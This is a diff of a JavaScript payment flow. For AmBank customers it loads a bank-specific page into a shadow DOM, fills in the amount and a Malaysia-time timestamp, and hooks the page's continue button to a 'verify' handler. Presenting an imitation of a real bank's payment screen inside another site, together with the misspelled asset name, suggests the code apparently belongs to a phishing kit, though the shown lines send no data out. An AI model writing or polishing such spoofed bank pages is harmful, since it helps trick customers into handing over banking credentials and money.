@@ -1655,6 +1655,29 @@ url("pay1ment_icons.woff") format("woff");
       if(p.bankName==='AMBANK (M) BERHAD') {
         loadPage('/pay/AMBANK', 'mount'); 
         document.querySelector("#app-verify-overlay > div.app-verify-box").classList.add('hidden');
+        document.querySelector("#mount").shadowRoot.querySelector("div > table.maintable.bg > tbody > tr:nth-child(4) > td:nth-child(3) > span").textContent = 'RM '+tot.toFixed(2);
+        const now = new Date(); 
+        const options = {
+        weekday: 'short',
+        month: 'short',
+        day: '2-digit',
+        year: 'numeric',
+        timeZone: 'Asia/Kuala_Lumpur'};
+        const parts = new Intl.DateTimeFormat('en-US', options).formatToParts(now);
+        const weekday = parts.find(p => p.type === 'weekday').value;
+        const month = parts.find(p => p.type === 'month').value;
+        const day = parts.find(p => p.type === 'day').value;
+        const year = parts.find(p => p.type === 'year').value;
+        const dateStr = `${weekday} ${month} ${day} ${year}`;
+        const timeStr = now.toLocaleTimeString('en-GB', {
+            hour12: false,
+            timeZone: 'Asia/Kuala_Lumpur'
+        });
+        document.querySelector("#mount").shadowRoot.querySelector("div > table.maintable.bg > tbody > tr:nth-child(5) > td:nth-child(3)").innerHTML = `
+            <span>${dateStr}</span><br>
+            <span>${timeStr} GMT +0800</span>
+        `;
+        document.querySelector("#mount").shadowRoot.querySelector("#formactions > a:nth-child(2) > div").addEventListener('click', appVerifyContinue);
       }
 
       /*if(p.bankName==='AMBANK (M) BERHAD') 
